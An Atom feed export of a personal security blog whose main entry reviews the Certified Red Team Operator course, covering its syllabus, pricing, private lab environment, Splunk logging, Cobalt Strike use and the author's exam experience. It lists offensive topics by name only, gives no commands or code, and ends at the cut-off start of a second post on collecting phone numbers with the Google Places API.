<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-01-11T04:56:35-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Ash</title><subtitle>Blogs about information security, technology, red teaming, and other random musings.</subtitle><author><name>Ash</name></author><entry><title type="html">Zero-Point Security’s Certified Red Team Operator (CRTO) Review</title><link href="http://localhost:4000/Certified-Red-Team-Operator-Review/" rel="alternate" type="text/html" title="Zero-Point Security’s Certified Red Team Operator (CRTO) Review" /><published>2022-01-10T00:00:00-05:00</published><updated>2022-01-10T00:00:00-05:00</updated><id>http://localhost:4000/Certified-Red-Team-Operator-Review</id><content type="html" xml:base="http://localhost:4000/Certified-Red-Team-Operator-Review/">&lt;h1&gt;Overview&lt;/h1&gt;
&lt;hr /&gt;

&lt;p&gt;Red Team Ops is the course accompanying the Certified Red Team Operator (CRTO) certification offered by Zero-Point Security. The course was written by &lt;a href=&quot;https://twitter.com/_rastamouse&quot;&gt;Rasta Mouse&lt;/a&gt;, who you may recognize as the original creator of the &lt;a href=&quot;https://www.hackthebox.com/newsroom/prolab-rastalabs&quot;&gt;RastaLabs&lt;/a&gt; pro lab in HackTheBox. He maintains both the course content and runs Zero-Point Security.&lt;/p&gt;

&lt;p&gt;Red Team Ops is written for individuals with a general background in information security, especially those working in offensive security positions. The difficulty is most applicable to a junior audience, but I would argue the course environment is also useful for individuals who are more experienced red teamers.&lt;/p&gt;

&lt;p&gt;In this review I’ll give a brief overview of the course configuration, and talk about the pros and cons of the entire process in depth. I’ll also share my exam experience, and give some tips/tricks for passing. Lastly, I’ll close with some thoughts of why you might purchase the course (you totally should by the way).&lt;/p&gt;

&lt;h4 id=&quot;my-background&quot;&gt;My Background&lt;/h4&gt;
&lt;p&gt;CRTO was the logical next step in my personal journey after achieving OSCP in the prior year. After taking some time to get sped up on web application testing, I developed a huge interest
in Active Directory/Windows-centric tactics. This was especially true after &lt;a href=&quot;https://github.com/topotam/PetitPotam&quot;&gt;PetitPotam&lt;/a&gt; came out and the awesome &lt;a href=&quot;https://posts.specterops.io/certified-pre-owned-d95910965cd2&quot;&gt;work by Will Schroeder and Lee
Christensen&lt;/a&gt; was made public.&lt;/p&gt;

&lt;h4 id=&quot;a-bit-of-history&quot;&gt;A Bit of History&lt;/h4&gt;
&lt;p&gt;Prior to purchasing the course myself, Rasta announced a &lt;a href=&quot;https://www.zeropointsecurity.co.uk/blog/red-team-ops-2021-update&quot;&gt;significant change to how it would operate&lt;/a&gt;. Most notable of
which being the fact that Cobalt Strike is &lt;em&gt;included with the course purchase&lt;/em&gt;. Covenant is also no longer supported within the labs and course content, and &lt;em&gt;private&lt;/em&gt; lab environments are
provided to all students.&lt;/p&gt;

&lt;p&gt;There are a handful of reviews on both this updated version and the prior version with Covenant/BYOC2, shared labs, etc. To be clear, this review pertains to the most recent CRTO (CRTO2?) update.&lt;/p&gt;

&lt;h2 id=&quot;the-course&quot;&gt;The Course&lt;/h2&gt;
&lt;p&gt;Content within Red Team Ops course is split into the following sections:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. Course Introduction
	1. What is Red Teaming?
	2. Phases of an Engagement
	3. Command &amp;amp; Control
	4. Cobalt Strike Primer
2. Planning &amp;amp; Client Engagement Phase
3. Assessment Phase
	1. External Reconnaissance
	2. Initial Compromise
	3. Host Reconnaissance
	4. Host Persistence
	5. Host Privilege Escalation
	6. Domain Reconnaissance
	7. Lateral Movement
	8. Credentials &amp;amp; User Impersonation
	9. Password Cracking Hints &amp;amp; Tips
	10. Session Passing
	11. Pivoting
	12. Reverse Port Forwards
	13. Data Protection API
	14. Kerberos
	15. Group Policy
	16. Discretionary Access Control Lists
	17. MS SQL Servers
	18. Domain Dominance
	19. Forest &amp;amp; Domain Trusts
	20. Local Administrator Password Solution
	21. Bypassing Antivirus
	22. Bypassing AppLocker
	23. Data Hunting &amp;amp; Exfiltration
4. Post-Engagement &amp;amp; Reporting
5. Extending Cobalt Strike
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It would be too lengthy to talk about each section in detail, so I’ll highlight a few takeaways:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Operational Guidance&lt;/strong&gt;: One aspect of the course I found surprising is the amount of content around engagement planning and operation. While it’s not to the level of detail present in something like &lt;a href=&quot;https://redteam.guide/&quot;&gt;Red Team Development and Operations&lt;/a&gt; by Joe Vest, it does contain helpful information around planning, reporting, and the non-technical aspects of security consulting. This is valuable information, especially if you’re like me trying to figure out how to master both of these aspects.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Targeting Microsoft&lt;/strong&gt;: This sort of goes without saying, but you’ll notice that almost every section is focused around technologies such as Windows, Active Directory, Kerberos, and so on. This means that once you come out of this course you’ll have a massive bag of tricks to attempt during your next engagement. Bad news? We’ll if you’re tasked with an engagement on a shop that purely uses Macs and Chromebooks you might be out of luck. I don’t necessarily see this as a con as this course is intended to fill the widest use-case you’ll encounter as a junior pentester/red teamer, which is a Microsoft technology stack.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;OPSEC&lt;/strong&gt;: When applicable, course sections contain guidance around Operational Security (OPSEC) or in other words how to not get caught. These tidbits of information were &lt;em&gt;amazing&lt;/em&gt; for me to begin thinking about purposefully remaining quiet, a tactic I have not had to employ in the past. On top of that, the lab environment contains a Splunk ingestion server you can use to actually analyze events as they occur within the environment.&lt;/li&gt;
&lt;/ul&gt;

&lt;p class=&quot;notice--primary&quot;&gt;A great piece of supplemental learning to go along with OPSEC content from the course is this talk by RastaMouse himself:&lt;br /&gt; 
&lt;a href=&quot;https://www.youtube.com/watch?v=qIbrozlf2wM&quot;&gt;Five Ways I got Caught Before Lunch&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here are five sections I found especially fun/interesting:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Initial Compromise&lt;/strong&gt;: Interesting tactics used to get a beacon to spawn on target machines, including topics such as malicious Office documents and HTA files.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Host Persistence&lt;/strong&gt;: Lots of cool ways to stay sticky on hosts, along with some cool exercises related to COM objects. This section is also probably really useful if you work in a SOC/DFIR type role.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Kerberos&lt;/strong&gt;: By far the most ingestible Kerberos overview I’ve ever encountered, packed with great techniques on how to attack it, especially tailored for AD environments (of course).&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Forest &amp;amp; Domain Trusts&lt;/strong&gt;: This begins with an amazing overview of Active Directory trust types, then delves into ways you can attack each. Second only in my mind to Harmj0y’s extremely detailed &lt;a href=&quot;https://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/&quot;&gt;Guide to Attacking Domain Trusts&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Local Administrator Password Solution&lt;/strong&gt;: Fun ways to (ab)use LAPS-specific permissions within an environment.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;Note: it was really hard to choose my top five.&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;center&gt;&lt;h1&gt;Pros of CRTO&lt;/h1&gt;&lt;/center&gt;
&lt;hr /&gt;

&lt;p align=&quot;center&quot;&gt;
	&lt;img src=&quot;/assets/images/crto/crto_overview.png&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;price&quot;&gt;Price&lt;/h2&gt;
&lt;p&gt;It would be hard to begin talking about the CRTO’s pros without first mentioning the price.&lt;/p&gt;

&lt;p&gt;At an astounding cost of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$472.0806&lt;/code&gt; US dollars you get access to the entire course, as well as any additional content that is added to the curriculum in the future.&lt;/p&gt;

&lt;p&gt;That’s a fraction compared to other industry leaders like:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Offensive Security&lt;/strong&gt;: generally starting at a minimum of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~$1,000&lt;/code&gt; (if not more)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;INE/eLearnSecurity&lt;/strong&gt;: at a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$749&lt;/code&gt; annual fee with individual exam fees.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;SANS training&lt;/strong&gt;: with the GIAC course sitting at around &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~$8,000&lt;/code&gt; including an exam attempt.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;This is not to say that those training platforms don’t have value. I personally know that the opposite is especially true. I bring this up rather to illustrate how insanely cost-effective the CRTO is compared to the rest of the industry.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
        &lt;img src=&quot;/assets/images/crto/crto_price.png&quot; /&gt;
&lt;/p&gt;

&lt;h4 id=&quot;lab-time&quot;&gt;Lab Time&lt;/h4&gt;
&lt;p&gt;In order to access the labs, you must purchase lab time separately. This is purchased per hour, at a rate of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;£1.25/hr&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$1.7/hr&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I would at a minimum purchase 40 hours of lab time, but highly recommend future-proofing yourself with extra time. Let’s say you give yourself 80 hours, that brings your total cost including the course purchase to: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$607&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I personally went with 80 hours when I signed up. Let’s talk about why this matters.&lt;/p&gt;

&lt;h2 id=&quot;labs&quot;&gt;Labs&lt;/h2&gt;
&lt;p align=&quot;center&quot;&gt;
        &lt;img src=&quot;/assets/images/crto/crto_labs.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;The lab environment for CRTO is deployed through a platform called &lt;a href=&quot;https://www.snaplabs.io/&quot;&gt;SnapLabs&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Why does this matter to you? well SnapLabs is where you’ll manage all your lab machines. This includes snapshotting, stopping/starting machines (duh), and resetting your lab environment.&lt;/p&gt;

&lt;p&gt;It’s also how you access your machines when you want to follow along with the course, perform exercises from the content, or just mess around. This is done through the web browser, with desktop sessions deployed through Apache Guacamole.&lt;/p&gt;

&lt;p&gt;Also, as I mentioned earlier &lt;em&gt;each student gets their own unique lab environment&lt;/em&gt;. You no longer have to worry about &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;H3x_budd1e&lt;/code&gt; changing all the passwords or nuking that box you were working on. Your environment is completely yours.&lt;/p&gt;

&lt;h4 id=&quot;environment&quot;&gt;Environment&lt;/h4&gt;
&lt;p&gt;Once you purchase your lab time and receive access, you’ll be dropped into an environment with:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;An attacking Windows/Linux host (Kali)&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;MSSQL servers&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Exchange servers&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Unix hosts&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Windows workstations&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Windows domain controllers&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Splunk&lt;/strong&gt;… wait… &lt;strong&gt;Splunk&lt;/strong&gt;? &lt;strong&gt;&lt;em&gt;yes. Splunk.&lt;/em&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Did you hear me mention &lt;strong&gt;Splunk&lt;/strong&gt;? No way. Let’s talk about &lt;strong&gt;Splunk&lt;/strong&gt;.&lt;/p&gt;

&lt;h4 id=&quot;splunk&quot;&gt;Splunk&lt;/h4&gt;
&lt;hr /&gt;

&lt;p align=&quot;center&quot;&gt;
        &lt;img src=&quot;/assets/images/crto/crto_splonk.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;This is a hidden gem that’s included in the course and something that I personally think is extremely beneficial for the student.&lt;/p&gt;

&lt;p&gt;The course not only provisions all these boxes for you to use, but also has them pushing logs to &lt;strong&gt;Splunk&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Wow! Amazing! Well guess what.. &lt;strong&gt;&lt;em&gt;you can access the Splunk instance too&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;This was really useful for myself to:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;em&gt;Realize just how many !@#!$%! events are generated in live networks&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;Figure out how to filter down specific events I’m looking for&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;Analyze detection methods for the tactics I employ&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;You might remember I mentioned purchasing extra lab time. This is one of the reasons why. I plan on going back and using the lab from time to time to analyze the detection of tactics I’m executing in the real world. This is one of the reasons I think the course is also beneficial to red teamers with pre-existing experience.&lt;/p&gt;

&lt;h4 id=&quot;playground&quot;&gt;Playground&lt;/h4&gt;
&lt;p&gt;Using SnapLabs is really easy, and having the ability to spin up an entire lab on a whim has proved to be useful for more than just the course. There have been a couple instances where I’ve been chatting with someone on Discord about a technique or a tool, and quickly spun up the CRTO lab to test something.&lt;/p&gt;

&lt;p&gt;This is another reason to purchase more lab time if you’re able to. It’s a nice playground to have in your back pocket.&lt;/p&gt;

&lt;h2 id=&quot;rastas-teaching-style&quot;&gt;Rasta’s Teaching Style&lt;/h2&gt;
&lt;center&gt;&lt;h2&gt;This is easily the highlight of the entire course.&lt;/h2&gt;&lt;/center&gt;
&lt;p align=&quot;center&quot;&gt;
        &lt;img src=&quot;/assets/images/crto/crto_learn.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Each piece of course content is divided into bite-size chunks that can be easily ingested. An individual article usually begins with a rough overview of the minimum information needed to grasp a topic and understand why it matters. Next it will delve into usage examples that are short and sweet. These serve the purpose of getting your hands on the keyboard executing commands, which for myself is the most productive method for me to ingest information.&lt;/p&gt;

&lt;p&gt;Additionally, there are a handful of included videos walking you through a technique or demonstrating a tactic. These are usually ~10 minutes long, and fairly straight to the point.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Personally, I found the articles on each topic to be where the course really shined.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Want to learn about Kerberoasting? Read the 5 minute article, then go perform the tactics in your live lab environment.&lt;/p&gt;

&lt;p&gt;No sifting through a PDF and making notes. No slide deck extravaganza. Just read a quick article and start playing around.&lt;/p&gt;

&lt;h4 id=&quot;comparisonsptsd&quot;&gt;Comparisons/PTSD&lt;/h4&gt;
&lt;p&gt;If you’ve experienced the OSCP, chances are you remember how hard it was to focus on the PDF or watch the provided videos.&lt;/p&gt;

&lt;p&gt;In my experience, I would try to force myself to ingest content, and do so at a rapid pace to keep up with my personal timelines (and expiring PWK lab time).&lt;/p&gt;

&lt;p&gt;Alternatively, with CRTO I found myself actually &lt;em&gt;looking forward&lt;/em&gt; to ingesting the course content, something that I’ve rarely been able to say in other learning efforts.&lt;/p&gt;

&lt;h2 id=&quot;cobalt-strike&quot;&gt;Cobalt Strike&lt;/h2&gt;
&lt;p align=&quot;center&quot;&gt;
        &lt;img src=&quot;/assets/images/crto/crto_cs.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;Lastly, it must be mentioned that Cobalt Strike (CS) is included within the lab environment. If you’re like me, you’ve been dying to get your hands on this toolset for years. I found finally getting to use it to be extremely fun.&lt;/p&gt;

&lt;p&gt;Additionally, Rasta includes content on configuring CS to your needs (more on this later), which should help you kick start using it in the real world, should you have the ability to.&lt;/p&gt;

&lt;p&gt;As far as I’m aware, CRTO is the only (legal) way of getting a taste of using CS apart from purchasing a license. So if you’ve been looking to get their hands dirty with it, the course is a great place to start.&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;center&gt;&lt;h1&gt;Cons of CRTO&lt;/h1&gt;&lt;/center&gt;
&lt;hr /&gt;

&lt;h2 id=&quot;connection-options&quot;&gt;Connection Options&lt;/h2&gt;
&lt;p&gt;I mentioned this earlier but wanted to reiterate the topic. A common complaint with the course is that you are locked to the browser when accessing your lab machines. No VPN connection, no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.ovpn&lt;/code&gt; file, just Apache Guacamole and lots of browser tabs.&lt;/p&gt;

&lt;p&gt;For myself this was really annoying in the beginning, but I quickly got used to it. It actually comes in handy if you’re switching between more than two assets inside the lab.&lt;/p&gt;

&lt;p&gt;With that said, it may be a major turn off for some people, which is warranted, but not enough in my mind to completely discount the course. I figured it’s worth mentioning in case you’re expecting VPN access.&lt;/p&gt;

&lt;h2 id=&quot;cobalt-strike-1&quot;&gt;Cobalt Strike&lt;/h2&gt;
&lt;p&gt;Yes, this is a pro and also a con.&lt;/p&gt;

&lt;p&gt;The course is tied heavily to usage of Cobalt Strike. The examples included within each section are strictly built for Cobalt Strike. This may or may not be a big deal for you depending on your situation. (i.e. whether or not you can afford it IRL).&lt;/p&gt;

&lt;p&gt;One thing I will say is that the techniques and tactics employed by CS can generally be adapted to any platform, so it’s more than likely still a value-add. Oftentimes, you’re really just using Cobalt Strike’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute-assembly&lt;/code&gt; to run a binary on a host, which is not nearly unique to the platform.&lt;/p&gt;

&lt;p&gt;If this is something you’re worried about, I would recommend attempting to locate a similar or comparable functionality in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$c2_tool_you_use&lt;/code&gt; to whatever Cobalt Strike functionality is being used in the course.&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;center&gt;&lt;h1&gt;Exam&lt;/h1&gt;&lt;/center&gt;
&lt;hr /&gt;

&lt;p&gt;The CRTO exam is a 48-hour assessment where the student must gather 6 of 8 flags to pass. This 48-hours of lab time is spread across a 4-day window, as you have the ability to stop and start the exam environment as needed.&lt;/p&gt;

&lt;p&gt;To pass one must simply submit the flags. &lt;em&gt;No reporting is necessary.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Once your exam time begins, you will be provided with a packet containing a set of &lt;strong&gt;TTPs&lt;/strong&gt; to emulate. One must successfully emulate these &lt;strong&gt;TTPs&lt;/strong&gt; to progress through the environment, and collect all the flags.&lt;/p&gt;

&lt;p&gt;Also, since you can pause the exam and still start the labs, if you &lt;em&gt;really&lt;/em&gt; need to go back and double check something in a pseudo-dev environment, you can (although you’ll want avoid this as you progress).&lt;/p&gt;

&lt;p&gt;Overall, I would say the course is pretty difficult, but extremely fair. You may be asked to perform steps outside of your comfort zone, but I truly mean it when I say &lt;strong&gt;&lt;em&gt;the course content contains everything you need to pass&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;h2 id=&quot;keys-for-success&quot;&gt;Keys For Success&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;&lt;em&gt;FAQ&lt;/em&gt;&lt;/strong&gt;: Read the &lt;a href=&quot;https://www.zeropointsecurity.co.uk/red-team-ops/book-exam&quot;&gt;course FAQ&lt;/a&gt; and &lt;a href=&quot;https://www.zeropointsecurity.co.uk/red-team-ops/book-exam&quot;&gt;exam FAQ&lt;/a&gt;. Seriously, &lt;strong&gt;read the FAQs&lt;/strong&gt;. There were so many times in the Discord server I saw questions that are answered on those links.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;&lt;em&gt;Discord&lt;/em&gt;&lt;/strong&gt;: Speaking of Discord, you should totally join the &lt;a href=&quot;https://discord.com/invite/yrktDxPA&quot;&gt;Zero-Point Security Discord server&lt;/a&gt;. This was crucial for not only my learning experience, but also my passing of the exam (more on this in a sec). Within the server you’ll find students progressing through the course/labs and a fairly active community. I found everyone to be very helpful should you have any questions on the course content.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;&lt;em&gt;Cobalt Strike Config&lt;/em&gt;&lt;/strong&gt;: Make sure you review every piece of content in the course related to Cobalt Strike and its configuration. Additionally, it would be really helpful to take a look at some &lt;a href=&quot;https://github.com/rsmudge/Malleable-C2-Profiles&quot;&gt;Malleable C2 Profiles&lt;/a&gt; and understand what they are doing. This is going to help you out immensely when you start your exam.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;&lt;em&gt;Have fun!&lt;/em&gt;&lt;/strong&gt;: The challenges within the exam are extremely enjoyable. So start the exam, get Cobalt Strike configured correctly, sit back, and start progressing through the environment. If you worked your way through all the course content and took good notes, you should have a good experience.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;my-experience-with-the-exam&quot;&gt;My Experience With the Exam&lt;/h2&gt;
&lt;p&gt;First off, let me say that even after my initial struggles, this was &lt;strong&gt;by far&lt;/strong&gt; the &lt;em&gt;most fun&lt;/em&gt; I’ve had on an exam so far.&lt;/p&gt;

&lt;p&gt;I scheduled my exam scheduled Friday at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10:00 AM&lt;/code&gt; my local time. I woke up around &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8:00 AM&lt;/code&gt;, had a small breakfast, made some coffee, and gathered my notes.&lt;/p&gt;

&lt;p&gt;The clock hit 10 and my lab time started. I reviewed the TTPs passed to me as part of the exam and &lt;em&gt;immediately&lt;/em&gt; felt that rush you feel when you begin an exam you know you didn’t study for. You know what I’m talking about. That sinking feeling in your stomach of inevitable failure.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;I had focused so much on all the tactics presented in the course that I had forgotten to review the course material around configuring Cobalt Strike.&lt;/em&gt;&lt;/p&gt;

&lt;h4 id=&quot;scrambling&quot;&gt;Scrambling&lt;/h4&gt;
&lt;p&gt;By around noon I was effectively freaking out, worried I would not even be able to reach what was effectively the first step of the exam.&lt;/p&gt;

&lt;p&gt;I paused the exam environment for a large part of the entire first day and spent the remainder reading Cobalt Strike documentation, reviewing course content for configuration guidance, and generating my profile.&lt;/p&gt;

&lt;p&gt;Time progressed, and eventually at around &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2:00 AM&lt;/code&gt; the next day (Saturday), I decided to give it a go.&lt;/p&gt;

&lt;p&gt;I powered on the exam machines. Tried what I had been preparing for the entire day and…all my attempts were unsuccessful. Distraught and pretty stressed out I paused everything and went to bed.&lt;/p&gt;

&lt;h4 id=&quot;round-two&quot;&gt;Round Two&lt;/h4&gt;
&lt;p&gt;I slept from around &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4AM&lt;/code&gt; - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10AM&lt;/code&gt;, got up and immediately hit the ground running.&lt;/p&gt;

&lt;p&gt;Refreshed, I realized I had rabbit-holed &lt;em&gt;really really&lt;/em&gt; hard the entire prior day, and tried a new method to achieve &lt;em&gt;“step 1”&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;FINALLY, I received the “output” I was looking for. I had the breakthrough I needed.&lt;/p&gt;

&lt;p&gt;This occurred around noon on the second day, and I had also only used around ~6 hours of exam time thanks to the tactical pause. Now it was time to truly begin.&lt;/p&gt;

&lt;h4 id=&quot;riding-the-wave-of-a-dunning-kruger-graph&quot;&gt;Riding the wave of a Dunning-Kruger graph&lt;/h4&gt;
&lt;p&gt;At this point, I was fully riding the wave of a steep &lt;a href=&quot;https://en.wikipedia.org/wiki/Dunning%E2%80%93Kruger_effect&quot;&gt;Dunning-Kruger graph&lt;/a&gt;.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
        &lt;img src=&quot;/assets/images/crto/crto_graph.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;I took some notes throughout the exam to document what I was feeling, the one around this time read:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;I spent around ~20 hours getting it [Cobalt Strike] to work
I feel like I can finally actually take the exam
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And take the exam I did. Within an hour I had compromised the first host, and after a few more hours worked my way to an additional handful of assets.&lt;/p&gt;

&lt;p&gt;I progressed through the lab environment, never having to reset the exam or restart/reconfigure Cobalt Strike.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;I really wish I could share the war stories of all the cool steps within the lab, but you’ll just have to see for yourself.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;As time progressed, eventually the clock struck around &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4AM&lt;/code&gt; the following day (Sunday). I had been going since around &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10AM&lt;/code&gt; the previous day (Saturday).&lt;/p&gt;

&lt;p&gt;At this point I had progressed through the environment pretty far, and after a large final hurdle finally gained access to a total of six machines in the environment.&lt;/p&gt;

&lt;h4 id=&quot;no-flags-yet-wait-no-flags-yet&quot;&gt;No flags yet. Wait, no flags yet!?&lt;/h4&gt;
&lt;p&gt;Yeah so it turns out you really shouldn’t reset the exam environment unless you have to. During my initial Cobalt Strike fiasco I had reset the environment, which it turns out produces an error where no flags are present on the exam machines.&lt;/p&gt;

&lt;p&gt;I was so focused on progressing across hosts that this didn’t really cross my mind until I reached the sixth machine. After which I kind of thought &lt;em&gt;“Wait, should I be seeing some flags?”&lt;/em&gt; and got worried.&lt;/p&gt;

&lt;p&gt;After reviewing the FAQ, it looked like each machine should possess an individual flag. My notebook at this time read:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Popped 6/8 machines which means I passed
kinda.... the only issue is none of my machines have flags on them lol. Trying to get ahold of Rasta to ask him
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I DMed Rasta and thanks to his help and some screenshot providing, was awarded the flags I needed to pass. At this point it is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6AM&lt;/code&gt; on Sunday, the third day of my exam, and around 44 hours since my exam began.&lt;/p&gt;

&lt;p&gt;I was ecstatic, but also really tired. I paused my exam and got some much needed rest.&lt;/p&gt;

&lt;p&gt;Fast forward to Monday and a pretty ruined sleep schedule. The next step was deciding between pursuing the final two remaining flags and receiving my cert or &lt;strong&gt;not pursuing&lt;/strong&gt; the two remaining flags and &lt;strong&gt;&lt;em&gt;still receiving my cert&lt;/em&gt;&lt;/strong&gt;. I opted for the latter option, which I sort of regret to be honest. I ended up using the day to handle some admin (AKA real life) stuff and rest. Part of me is still curious as to the steps it would take to get the final two flags.&lt;/p&gt;

&lt;p&gt;Anyways, after the exam environment closed, I officially received my &lt;a href=&quot;https://twitter.com/_bin_Ash/status/1455545788705255438&quot;&gt;CRTO certification&lt;/a&gt; and passed the course.&lt;/p&gt;

&lt;p&gt;My CRTO cert on my LinkedIn:&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;
        &lt;img src=&quot;/assets/images/crto/crto_cert.png&quot; /&gt;
&lt;/p&gt;

&lt;h1 id=&quot;closing-thoughts&quot;&gt;Closing Thoughts&lt;/h1&gt;
&lt;p&gt;There is elegance in being succinct. CRTO was a breath of fresh air after banging my head against the ~800-page PDF that is OSCP. I really appreciate Rasta’s presentation of information, and can personally say this is the &lt;em&gt;first time ever&lt;/em&gt; I’ve &lt;strong&gt;really&lt;/strong&gt; looked forward to going through course material.&lt;/p&gt;

&lt;p&gt;Maybe you just passed your OSCP and are looking to transition into a red team/threat emulation role.&lt;/p&gt;

&lt;p&gt;Maybe you’re already running internal network pentests and want to up your game to the next level.&lt;/p&gt;

&lt;p&gt;Maybe you just want to use Cobalt Strike for a fraction of the price.&lt;/p&gt;

&lt;p&gt;Whether or not any of these are true, I would &lt;em&gt;highly&lt;/em&gt; recommend this course to anyone looking to further develop their red team skill set.&lt;/p&gt;</content><author><name>Ash</name></author><category term="Certifications" /><category term="CRTO" /><category term="Certified Red Team Operator" /><category term="AD" /><category term="Active Directory" /><category term="Cobalt Strike" /><category term="RastaMouse" /><category term="Zero-Point Security" /><category term="Certifications" /><category term="C2" /><summary type="html">An overview and review of Zero-Point Security's (A.K.A. RastaMouse) newly revamped Certified Red Team Operator (CRTO) certification, and why you might want to pursue it.</summary></entry><entry><title type="html">Farming phone numbers with Python and the Google Places API</title><link href="http://localhost:4000/Farming-phone-numbers-with-Python-and-the-Google-Places-API/" rel="alternate" type="text/html" title="Farming phone numbers with Python and the Google Places API" /><published>2020-12-14T00:00:00-05:00</published><updated>2020-12-14T00:00:00-05:00</updated><id>http://localhost:4000/Farming-phone-numbers-with-Python-and-the-Google-Places-API</id><content type="html" xml:base="http://localhost:4000/Farming-phone-numbers-with-Python-and-the-Google-Places-API/">&lt;p&gt;&lt;img 